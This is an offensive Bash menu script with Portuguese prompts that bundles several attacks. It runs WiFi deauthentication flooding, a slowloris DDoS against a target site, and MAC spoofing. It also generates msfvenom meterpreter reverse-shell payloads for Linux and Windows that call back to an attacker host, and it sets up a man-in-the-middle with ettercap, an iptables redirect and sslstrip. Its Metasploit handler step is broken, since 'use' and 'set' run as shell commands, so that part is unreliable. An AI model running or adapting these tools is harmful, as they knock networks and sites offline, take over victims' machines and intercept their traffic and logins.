#!/bin/bash


clear
echo ":"
echo
echo "1-DOS WIFI "
echo "2-DDOS SITE"
echo "3-EXPLOITS PASSIVOS"
echo "4-MAC SPOOF"
echo "5-MITM"
echo
read caixa

case $caixa in

"1")
clear
ifconfig
echo
echo "Interface de rede?"
echo
read inter
clear
ifconfig
echo
echo "Interface de captura?"
echo
read cap
airmon-ng check kill
airmon-ng start $inter
airodump-ng $cap
echo
echo "Canal/CH?"
echo
read ch
echo
echo "Mac/Bssid?"
echo
read bsd
clear
airodump-ng $cap -c $ch --bssid $bsd
aireplay-ng -0 100000000 -a $bsd $cap
;;

"2")
clear
echo "Ip do site?"
echo 
read site
perl ./slowloris.pl -dns $site
;;

"4")
clear
echo "1-Capturar macs"
echo "2-Spoofar Mac"

read teste

	if [ "$teste" = "1" ]
then
clear
ifconfig
echo
echo "Interface de rede?"
echo
read abc
airmon-ng check kill
airmon-ng start $abc
clear
ifconfig
echo
echo "Interface de captura?"
echo
read def
airodump-ng $def
echo 
echo
echo "Deseja reinicar o computador (s/n)?"
echo
read sn

        if [ "$sn" = "s" ]
then
clear
echo "Reiniciando o computador..."
sleep 5
reboot
else
exit
fi
	fi

	if [ "$teste" = "2" ]
then
clear
ifconfig
echo 
echo "Interface de rede?"
echo
read jkl
clear
echo "Novo mac?"
echo
read nmac
ifconfig $jkl down
macchanger -m $nmac $jkl
ifconfig $jkl up
fi
;;

"3")
clear
echo "1-Linux"
echo "2-Windows"
echo 
read lll

#PAYLOAD LINUX

	if [ "$lll" = "1" ]
then
clear
ifconfig
echo
echo "IP?"
echo
read ipp
clear
echo "Porta?"
echo
read port
clear
echo "Nome?"
echo
read nome
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ipp LPORT=$port -f elf > $nome.elf
echo
echo "O payload $nome foi gerado na pasta..."
pwd
echo
echo
echo "Iniciando Handler..."
use exploit/multi/handler >msf.rc
set PAYLOAD linux/x86/meterpreter/reverse_tcp >>msf.rc
set LHOST $ipp >>msf.rc
set LPORT $port >>msf.rc
run >>msf.rc
msfconsole -r msf.rc
fi

#PAYLOAD WINDOWS

	if [ "$lll" = "2" ]
then
clear
ifconfig
echo
echo "IP?"
echo
read ipp2
clear
echo "Porta?"
echo
read port2
clear
echo "Nome?"
echo
read nome2
echo
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipp2 LPORT=$port2 -f exe > $nome2.exe
clear
echo "Payload $nome2 gerado..."
pwd
echo
echo
echo
echo "Iniciando Handler..."

use exploit/multi/handler >msf.rc
set PAYLOAD windows/meterpreter/reverse_tcp >>msf.rc
set LHOST $ipp2 >>msf.rc
set LPORT $port2 >>msf.rc
run >>msf.rc
msfconsole -r msf.rc
fi
;;

"5")
clear
echo 1 >> /proc/sys/net/ipv4/ip_forward
ettercap -G&
echo "Redirecionar a porta 80 http para a porta 10000 do sslstrip:"
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
echo "Deixa o sslstrip lendo a porta 10000"
sslstrip -l 10000
;;

esac
